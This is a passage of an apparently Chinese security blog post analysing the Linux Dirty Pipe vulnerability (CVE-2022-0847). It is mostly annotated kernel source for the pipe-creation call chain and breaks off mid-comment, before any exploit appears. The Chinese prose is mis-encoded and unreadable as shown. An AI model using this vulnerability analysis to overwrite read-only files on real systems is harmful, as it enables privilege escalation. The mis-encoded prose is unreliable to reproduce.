

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
  <link rel="icon" href="/img/browser.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="korey0sh1">
  <meta name="keywords" content="">
  
    <meta name="description" content="è„è„çš„å¯¼ç®¡ï¼Ÿæ€ä¹ˆæ„Ÿè§‰è¿™ä¹ˆä¸å¯¹å‘¢ğŸ¤”">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-0847ï¼ˆDirty Pipe) Remake">
<meta property="og:url" content="http://example.com/2024/03/18/dirtypipe/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="è„è„çš„å¯¼ç®¡ï¼Ÿæ€ä¹ˆæ„Ÿè§‰è¿™ä¹ˆä¸å¯¹å‘¢ğŸ¤”">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321205252.png">
<meta property="article:published_time" content="2024-03-18T08:14:56.000Z">
<meta property="article:modified_time" content="2024-04-14T01:14:06.492Z">
<meta property="article:author" content="korey0sh1">
<meta property="article:tag" content="OS">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321205252.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CVE-2022-0847ï¼ˆDirty Pipe) Remake - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>korey0sh1</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>å‹é“¾</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/116096529_p0_master1200.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2022-0847ï¼ˆDirty Pipe) Remake"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        korey0sh1
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-18 16:14" pubdate>
          2024å¹´3æœˆ18æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          5k å­—
        
      </span>
    

    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2022-0847ï¼ˆDirty Pipe) Remake</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2024å¹´4æœˆ14æ—¥ ä¸Šåˆ
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p><strong>Dirty</strong>ç³»åˆ—ç¬¬äºŒå¼¹</p>
<p>å› ä¸ºè¯¥æ¼æ´å‘ç°åœ¨å¯¹ç®¡é“å†™å…¥æ•°æ®åï¼Œè¯»å–å®Œæ¯•åæœªæ¸…ç©º<code>pipe_buffer-&gt;flags</code>ï¼Œé€ æˆè¶Šæƒå†™å…¥åªè¯»æ–‡ä»¶</p>
<p>å’Œ<strong>Dirty Cow</strong>å¾ˆåƒï¼Œå› æ­¤è¢«å† ä»¥<strong>Dirty Pipe</strong>çš„ç§°å‘¼</p>
<p>ä½†æ˜¯å’Œ<strong>Dirty Cow</strong>éœ€è¦çº¿ç¨‹ç«äº‰ç›¸æ¯”ï¼Œ<strong>Dirty Pipe</strong>ç¨³å®šè®¸å¤š</p>
<p>PSï¼šä¸‹æ–‡æ‰€æœ‰æºç çš„ç‰ˆæœ¬ä¸º 5.8</p>
<h1 id="0x01ï¼šä¿¡æ¯æ”¶é›†"><a href="#0x01ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01ï¼šä¿¡æ¯æ”¶é›†"></a>0x01ï¼šä¿¡æ¯æ”¶é›†</h1><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2022-0847">NVD - cve-2022-0847 (nist.gov)</a></p>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321231636.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="0x02ï¼šå‰ç½®çŸ¥è¯†"><a href="#0x02ï¼šå‰ç½®çŸ¥è¯†" class="headerlink" title="0x02ï¼šå‰ç½®çŸ¥è¯†"></a>0x02ï¼šå‰ç½®çŸ¥è¯†</h1><h2 id="ä½•ä¸ºå¯¼ç®¡ğŸ¤”"><a href="#ä½•ä¸ºå¯¼ç®¡ğŸ¤”" class="headerlink" title="ä½•ä¸ºå¯¼ç®¡ğŸ¤”"></a>ä½•ä¸ºå¯¼ç®¡ğŸ¤”</h2><p>ä½•ä¸ºç®¡é“ï¼Ÿå¥½é—®é¢˜ï¼Œæ‰€è°“ç®¡é“ï¼Œå°±æ˜¯è¿æ¥ä¸€ä¸ªå†™è¿›ç¨‹ä¸ä¸€ä¸ªè¯»è¿›ç¨‹ï¼Œç”¨äºä¸¤è¿›ç¨‹é—´é€šä¿¡çš„å…±äº«æ–‡ä»¶ï¼Œåˆç§°<code>pipe</code>æ–‡ä»¶</p>
<p>å‘ç®¡é“ï¼ˆå…±äº«æ–‡ä»¶ï¼‰æä¾›è¾“å…¥çš„å‘é€è¿›ç¨‹ï¼ˆå³å†™è¿›ç¨‹ï¼‰ï¼Œä»¥å­—ç¬¦æµå½¢å¼å°†å¤§é‡çš„æ•°æ®é€å…¥ç®¡é“ï¼›è€Œæ¥æ”¶ç®¡é“è¾“å‡ºçš„æ¥æ”¶è¿›ç¨‹ï¼ˆå³è¯»è¿›ç¨‹ï¼‰ï¼Œå¯ä»ç®¡é“ä¸­æ¥æ”¶æ•°æ®ã€‚ç”±äºå‘é€è¿›ç¨‹å’Œæ¥æ”¶è¿›ç¨‹æ˜¯åˆ©ç”¨ç®¡é“è¿›è¡Œé€šä¿¡çš„ï¼Œæ•…åˆç§°ç®¡é“é€šä¿¡ã€‚</p>
<p>ä¸ºäº†åè°ƒåŒæ–¹çš„é€šä¿¡ï¼Œç®¡é“é€šä¿¡æœºåˆ¶å¿…é¡»æä¾›ä»¥ä¸‹3 æ–¹é¢çš„åè°ƒèƒ½åŠ›ã€‚</p>
<ul>
<li>äº’æ–¥ã€‚å½“ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨å¯¹ <code>pipe</code> è¿›è¡Œè¯»&#x2F;å†™æ“ä½œæ—¶ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹å¿…é¡»ç­‰å¾…ã€‚</li>
<li>åŒæ­¥ã€‚å½“å†™ï¼ˆè¾“å…¥ï¼‰è¿›ç¨‹æŠŠä¸€å®šæ•°é‡ï¼ˆå¦‚4KBï¼‰æ•°æ®å†™å…¥ pipe åï¼Œä¾¿å»ç¡çœ ç­‰å¾…ï¼Œç›´åˆ°è¯»ï¼ˆè¾“å‡ºï¼‰è¿›ç¨‹å–èµ°æ•°æ®åï¼Œå†æŠŠå®ƒå”¤é†’ã€‚å½“è¯»è¿›ç¨‹è¯»åˆ°ä¸€ç©º <code>pipe</code> æ—¶ï¼Œä¹Ÿåº”ç¡çœ ç­‰å¾…ï¼Œç›´è‡³å†™è¿›ç¨‹å°†æ•°æ®å†™å…¥ç®¡é“åï¼Œæ‰å°†å®ƒå”¤é†’ã€‚</li>
<li>å¯¹æ–¹æ˜¯å¦å­˜åœ¨ã€‚åªæœ‰ç¡®å®šå¯¹æ–¹å·²å­˜åœ¨æ—¶ï¼Œæ‰èƒ½è¿›è¡Œé€šä¿¡ã€‚</li>
</ul>
<h2 id="pipe-ã®-è°ƒç”¨é“¾"><a href="#pipe-ã®-è°ƒç”¨é“¾" class="headerlink" title="pipe ã® è°ƒç”¨é“¾"></a>pipe ã® è°ƒç”¨é“¾</h2><p>æ¥ä¸‹æ¥å°±æ¥çœ‹çœ‹<code>pipe</code>çš„å®ç°è¿‡ç¨‹</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">do_pipe2<br>	__do_pipe_flags<br>		create_pipe_files<br>			get_pipe_inode<br>				alloc_pipe_info<br></code></pre></td></tr></table></figure>



<h3 id="do-pipe2"><a href="#do-pipe2" class="headerlink" title="do_pipe2"></a>do_pipe2</h3><p><code>pipe</code>å’Œ<code>pipe2</code>éƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œéƒ½æ˜¯<code>do_pipe2</code>çš„å¥—å¨ƒï¼Œä¸åŒçš„æ˜¯ï¼Œ<code>pipe2</code>èƒ½è‡ªå·±æŒ‡å®š<code>flags</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE2(pipe2, <span class="hljs-type">int</span> __user *, fildes, <span class="hljs-type">int</span>, flags)<br>&#123;<br>	<span class="hljs-keyword">return</span> do_pipe2(fildes, flags);<br>&#125;<br><br>SYSCALL_DEFINE1(pipe, <span class="hljs-type">int</span> __user *, fildes)<br>&#123;<br>	<span class="hljs-keyword">return</span> do_pipe2(fildes, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sys_pipe() is the normal C calling standard for creating</span><br><span class="hljs-comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//fildes æ˜¯ä¸€ä¸ªæŒ‡å‘æ•´æ•°æ•°ç»„çš„æŒ‡é’ˆï¼Œç”¨äºå­˜å‚¨ç®¡é“ç«¯ç‚¹çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_pipe2</span><span class="hljs-params">(<span class="hljs-type">int</span> __user *fildes, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">files</span>[2];</span><br>	<span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>	<span class="hljs-type">int</span> error;<br>	<span class="hljs-comment">//æ ¸å¿ƒå‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°é¢„è®¡ä¼šåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå¹¶è¿”å›ç›¸åº”çš„æ–‡ä»¶æè¿°ç¬¦å’Œæ–‡ä»¶æŒ‡é’ˆæ•°ç»„ã€‚å¦‚æœè°ƒç”¨æˆåŠŸï¼Œè¿”å›å€¼ä¸º0</span><br>	error = __do_pipe_flags(fd, files, flags);<br>	<span class="hljs-keyword">if</span> (!error) &#123;<br>		<span class="hljs-keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="hljs-keyword">sizeof</span>(fd)))) &#123;<br>			fput(files[<span class="hljs-number">0</span>]);<br>			fput(files[<span class="hljs-number">1</span>]);<br>			put_unused_fd(fd[<span class="hljs-number">0</span>]);<br>			put_unused_fd(fd[<span class="hljs-number">1</span>]);<br>			error = -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//copy_to_user æˆåŠŸï¼Œé‚£ä¹ˆå®ƒå°†é€šè¿‡ fd_install å°†æ–‡ä»¶æè¿°ç¬¦å®‰è£…åˆ°å†…æ ¸ä¸­ï¼Œä»¥ä¾¿ç”¨æˆ·ç©ºé—´å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æè¿°ç¬¦è®¿é—®ç®¡é“ã€‚</span><br>			fd_install(fd[<span class="hljs-number">0</span>], files[<span class="hljs-number">0</span>]);<br>			fd_install(fd[<span class="hljs-number">1</span>], files[<span class="hljs-number">1</span>]);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="do-pipe-flags"><a href="#do-pipe-flags" class="headerlink" title="__do_pipe_flags"></a>__do_pipe_flags</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __do_pipe_flags(<span class="hljs-type">int</span> *fd, <span class="hljs-keyword">struct</span> file **files, <span class="hljs-type">int</span> flags)<br>&#123;<br>	<span class="hljs-type">int</span> error;<br>	<span class="hljs-type">int</span> fdw, fdr;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<br>	error = create_pipe_files(files, flags);<span class="hljs-comment">//æ ¸å¿ƒå‡½æ•°ï¼šæ¥åˆ›å»ºç®¡é“çš„æ–‡ä»¶å¯¹è±¡</span><br>	<span class="hljs-keyword">if</span> (error)<br>		<span class="hljs-keyword">return</span> error;<br>	<br>    <span class="hljs-comment">//ä¸¤æ¬¡æ¥è·å–æœªä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœè·å–å¤±è´¥ï¼Œåˆ™è·³è½¬åˆ°é”™è¯¯å¤„ç†éƒ¨åˆ†ã€‚</span><br>	error = get_unused_fd_flags(flags);<br>	<span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_read_pipe;<br>	fdr = error;<br><br>	error = get_unused_fd_flags(flags);<br>	<span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_fdr;<br>	fdw = error;<br><br>	audit_fd_pair(fdr, fdw);<span class="hljs-comment">//è®°å½•æ–‡ä»¶æè¿°ç¬¦çš„é…å¯¹æƒ…å†µ</span><br>	fd[<span class="hljs-number">0</span>] = fdr;<br>	fd[<span class="hljs-number">1</span>] = fdw;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br> err_fdr:<br>	put_unused_fd(fdr);<br> err_read_pipe:<br>	fput(files[<span class="hljs-number">0</span>]);<br>	fput(files[<span class="hljs-number">1</span>]);<br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="create-pipe-files"><a href="#create-pipe-files" class="headerlink" title="create_pipe_files"></a>create_pipe_files</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> get_pipe_inode();<span class="hljs-comment">//è·å–ä¸€ä¸ªç”¨äºç®¡é“çš„ inode å¯¹è±¡</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">f</span>;</span><br><br>	<span class="hljs-keyword">if</span> (!inode)<br>		<span class="hljs-keyword">return</span> -ENFILE;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>		<span class="hljs-keyword">if</span> (watch_queue_init(inode-&gt;i_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>			iput(inode);<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>		<span class="hljs-keyword">return</span> -ENOPKG;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	&#125;<br>	<span class="hljs-comment">//å‡½æ•°åˆ›å»ºä¸€ä¸ªä¼ªæ–‡ä»¶å¯¹è±¡ï¼Œè¯¥æ–‡ä»¶å¯¹è±¡è¿æ¥åˆ°ä¹‹å‰è·å–çš„ç®¡é“ inode ä¸Šã€‚å®ƒå°†æ ¹æ®ä¼ å…¥çš„æ ‡å¿—è®¾ç½®æ–‡ä»¶çš„è¯»å†™å±æ€§ï¼Œå¹¶å°†å…¶ä¸ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops å…³è”èµ·æ¥ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œä¼šé‡Šæ”¾ä¹‹å‰åˆ†é…çš„ç®¡é“ä¿¡æ¯å¹¶é‡Šæ”¾ inodeï¼Œç„¶åè¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç ã€‚</span><br>	f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>				&amp;pipefifo_fops);<br>	<span class="hljs-keyword">if</span> (IS_ERR(f)) &#123;<br>		free_pipe_info(inode-&gt;i_pipe);<br>		iput(inode);<br>		<span class="hljs-keyword">return</span> PTR_ERR(f);<br>	&#125;<br>	<span class="hljs-comment">//å¯¹åˆ›å»ºçš„å†™å…¥ç«¯æ–‡ä»¶å¯¹è±¡è®¾ç½®ç§æœ‰æ•°æ®æŒ‡é’ˆæŒ‡å‘ç®¡é“çš„ inodeã€‚</span><br>	f-&gt;private_data = inode-&gt;i_pipe;<br>	<span class="hljs-comment">//è°ƒç”¨ alloc_file_clone å‡½æ•°åˆ›å»ºä¸€ä¸ªå…‹éš†çš„æ–‡ä»¶å¯¹è±¡ä½œä¸ºè¯»å–ç«¯ï¼ŒåŒæ—¶å°†å…¶ä¸ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops å…³è”èµ·æ¥ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œä¼šé‡Šæ”¾ä¹‹å‰åˆ†é…çš„ç®¡é“ä¿¡æ¯ã€é‡Šæ”¾å†™å…¥ç«¯æ–‡ä»¶å¯¹è±¡å¹¶è¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç ã€‚</span><br>	res[<span class="hljs-number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),<br>				  &amp;pipefifo_fops);<br>	<span class="hljs-keyword">if</span> (IS_ERR(res[<span class="hljs-number">0</span>])) &#123;<br>		put_pipe_info(inode, inode-&gt;i_pipe);<br>		fput(f);<br>		<span class="hljs-keyword">return</span> PTR_ERR(res[<span class="hljs-number">0</span>]);<br>	&#125;<br>	res[<span class="hljs-number">0</span>]-&gt;private_data = inode-&gt;i_pipe;<br>	res[<span class="hljs-number">1</span>] = f;<br>	stream_open(inode, res[<span class="hljs-number">0</span>]);<br>	stream_open(inode, res[<span class="hljs-number">1</span>]);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="get-pipe-inode"><a href="#get-pipe-inode" class="headerlink" title="get_pipe_inode"></a>get_pipe_inode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> inode * <span class="hljs-title function_">get_pipe_inode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><br>	<span class="hljs-keyword">if</span> (!inode)<br>		<span class="hljs-keyword">goto</span> fail_inode;<br><br>	inode-&gt;i_ino = get_next_ino();<br>	<span class="hljs-comment">//åˆ†é…ä¸€ä¸ªæ–°çš„ç®¡é“ä¿¡æ¯ç»“æ„ä½“ 